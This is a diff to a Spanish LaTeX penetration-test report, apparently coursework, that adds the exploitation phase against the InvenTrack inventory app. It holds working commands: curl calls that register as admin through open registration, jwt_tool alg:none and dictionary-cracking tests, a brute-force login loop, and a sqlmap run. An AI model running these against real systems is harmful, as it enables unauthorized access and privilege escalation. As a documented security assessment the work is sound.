@@ -855,21 +855,112 @@ La Tabla \ref{tab:vulns} resume las vulnerabilidades identificadas en esta fase.
 
 %----------------------- FASE 5 -----------------------
 \subsection{Fase 5: Explotación (Exploitation) — 15\%}
-% Bypass de autenticación, fuerza bruta (rate limiting), inyección SQL, IDOR.
+Las pruebas de explotación se agruparon en otro script diferente para evitar la ejecución manual una a una. El script ejecuta por secciones la escalada por registro abierto, la autorización por rol, el análisis del JWT, la inyección SQL, la validación del rate limit, el CORS y la enumeración de usuarios. Como el login se limita a 3 intentos por cada 5 minutos y por IP, las pruebas que requieren un inicio de sesión válido se ejecutan antes de la de fuerza bruta.
 
-\subsubsection{Intento de Bypass de Autenticación}
-% >>> LLENAR: procedimiento, payloads, resultado <<<
+\subsubsection{Bypass de Autenticación y Escalada de Privilegios}
 
-\subsubsection{Fuerza Bruta contra el Login (Hydra / Burp Intruder)}
-\begin{lstlisting}[language=bash,caption={Comando de fuerza bruta ejecutado},label=lst:hydra]
-# hydra -l admin -P rockyou.txt conjunta3p.espe.edu.ec http-post-form ...
+El vector principal fue el registro abierto: \texttt{POST /api/auth/register} es público y toma el campo \texttt{rol} del cuerpo, por lo que un atacante se registra como \texttt{admin} sin autenticación previa. El Listado \ref{lst:escalada} muestra el procedimiento; el código 200 al acceder a \texttt{/api/usuarios} (ruta \texttt{soloAdmin}) confirma la escalada.
+
+\begin{lstlisting}[language=bash,caption={Escalada por registro abierto},label=lst:escalada]
+curl -s -X POST http://conjunta3p.espe.edu.ec/api/auth/register \
+  -H 'Content-Type: application/json' \
+  -d '{"nombre":"pentest","email":"p@test.com","password":"Password123","rol":"admin"}'
+TOKEN=$(curl -s -X POST http://conjunta3p.espe.edu.ec/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"p@test.com","password":"Password123"}' | jq -r .token)
+curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $TOKEN" \
+  http://conjunta3p.espe.edu.ec/api/usuarios
 \end{lstlisting}
 
-\subsubsection{Inyección SQL (Login / Chatbot)}
-% >>> LLENAR: payloads probados y resultado <<<
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{01_escalada.png}
+  \caption{Escalada de privilegios por registro abierto.}
+  \label{fig:escalada}
+\end{figure}
 
-\subsubsection{Pruebas de IDOR (Endpoints de Auditoría / Kardex)}
-% >>> LLENAR <<<
+El token se firma en HS256 con un \texttt{JWT\_SECRET} de entorno cuyo valor configurado (\texttt{jwt\_secret}) es débil, lo que permitiría crear un token de administrador. El Listado \ref{lst:jwt} muestra las pruebas aplicables con \texttt{jwt\_tool} (decodificación, prueba de \texttt{alg:none} y crackeo del secreto por diccionario).
+
+\begin{lstlisting}[language=bash,caption={Análisis del JWT con jwt\_tool},label=lst:jwt]
+jwt_tool <token>                      # decodificar
+jwt_tool <token> -X a                 # prueba de alg:none
+jwt_tool <token> -C -d rockyou.txt    # crackeo del secreto HMAC
+\end{lstlisting}
+
+\subsubsection{Fuerza Bruta contra el Login}
+
+El módulo \texttt{http-post-form} de Hydra no soporta el login JSON de InvenTrack, por lo que la fuerza bruta se realizó con un bucle de curl (Listado \ref{lst:bruteforce}). El rate limit (3 intentos por 5 minutos y por IP) ya se encontraba activo por las pruebas de inicio de sesión previas, de modo que las seis peticiones respondieron \texttt{429} (Figura \ref{fig:ratelimit}), lo que confirma que el control bloquea los intentos una vez superado el umbral.
+
+\begin{lstlisting}[language=bash,caption={Fuerza bruta con bucle de curl},label=lst:bruteforce]
+for i in $(seq 1 6); do
+  curl -s -o /dev/null -w "intento $i -> %{http_code}\n" \
+    -X POST http://conjunta3p.espe.edu.ec/api/auth/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"p@test.com","password":"incorrecta"}'
+done
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{06_rate_limit.png}
+  \caption{Respuestas \texttt{429} del login con el rate limit activo.}
+  \label{fig:ratelimit}
+\end{figure}
+
+\subsubsection{Inyección SQL (Login / Chatbot)}
+
+Se dirigió sqlmap al login (Listado \ref{lst:sqlmap}). La herramienta se detuvo ante la respuesta \texttt{401} que el endpoint devuelve a credenciales inválidas (Figura \ref{fig:sqli}), por lo que la prueba automática quedó inconclusa; para continuar habría que añadir la opción \texttt{--ignore-code=401}. La resistencia a la inyección SQL se sustenta, en cambio, en el uso de consultas parametrizadas (\texttt{mysql2} con marcadores \texttt{?}) en todo el código. En el chatbot no aplica la inyección SQL, ya que sus consultas son estáticas.
+
+\begin{lstlisting}[language=bash,caption={Inyección SQL dirigida al login con sqlmap},label=lst:sqlmap]
+sqlmap -u "http://conjunta3p.espe.edu.ec/api/auth/login" \
+  --data='{"email":"a@a.com","password":"x"}' \
+  --headers="Content-Type: application/json" --batch --level=2 --risk=1
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{05_sqli.png}
+  \caption{sqlmap detenido ante la respuesta \texttt{401} del login.}
+  \label{fig:sqli}
+\end{figure}
+
+\subsubsection{Autorización por Rol (IDOR / Kardex / Auditoría)}
+
+Los modulos de InvenTrack (inventario, kardex y auditoría) son globales y no están asociados a un usuario, por lo que el acceso directo a objetos por identificador (IDOR) no aplica en sentido estricto. La prueba se orientó a la autorización por rol (Listado \ref{lst:idor}): un usuario \texttt{almacenero} recibió \texttt{403} en \texttt{/api/usuarios} y \texttt{/api/auditoria} (rutas \texttt{soloAdmin}), lo que valida el control, mientras que \texttt{/api/movimientos} respondió \texttt{200} por tratarse de datos globales del inventario.
+
+\begin{lstlisting}[language=bash,caption={Autorización por rol con un token de almacenero},label=lst:idor]
+curl -s -o /dev/null -w "usuarios    -> %{http_code}\n" -H "Authorization: Bearer $ALM" \
+  http://conjunta3p.espe.edu.ec/api/usuarios
+curl -s -o /dev/null -w "auditoria   -> %{http_code}\n" -H "Authorization: Bearer $ALM" \
+  http://conjunta3p.espe.edu.ec/api/auditoria
+curl -s -o /dev/null -w "movimientos -> %{http_code}\n" -H "Authorization: Bearer $ALM" \
+  http://conjunta3p.espe.edu.ec/api/movimientos
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{02_autorizacion.png}
+  \caption{Autorización por rol: \texttt{403} en rutas \texttt{soloAdmin}.}
+  \label{fig:autorizacion}
+\end{figure}
+
+\subsubsection{CORS y Enumeración de Usuarios}
+
+Dos pruebas adicionales confirmaron hallazgos de la fase de análisis. Una petición con una cabecera \texttt{Origin} arbitraria recibió \texttt{Access-Control-Allow-Origin: *} (Figura \ref{fig:corsexp}), lo que evidencia la política de CORS abierta. Asimismo, el registro con un correo ya existente respondió \enquote{El email ya está registrado} (Figura \ref{fig:enum}), lo que permite enumerar las cuentas válidas.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{03_cors.png}
+  \caption{CORS abierto: \texttt{Access-Control-Allow-Origin: *} ante un \texttt{Origin} arbitrario.}
+  \label{fig:corsexp}
+\end{figure}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\linewidth]{03_enum.png}
+  \caption{Enumeración de usuarios mediante el registro.}
+  \label{fig:enum}
+\end{figure}
 
 %----------------------- FASE 6 -----------------------
 \subsection{Fase 6: Post-Explotación (Post-Exploitation) — 8\%}
